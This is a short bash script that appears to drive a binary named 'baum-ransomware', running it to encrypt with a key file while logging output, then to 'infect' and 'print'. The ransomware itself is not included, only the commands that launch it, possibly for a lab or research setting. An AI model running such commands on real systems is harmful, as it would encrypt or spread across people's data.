#!/bin/bash

NAME=baum-ransomware
BIN=./$NAME
KEY=.$NAME.key
LOG1=.$NAME.log1

$BIN --encrypt $KEY --verbose > $LOG1
$BIN --infect
$BIN --print
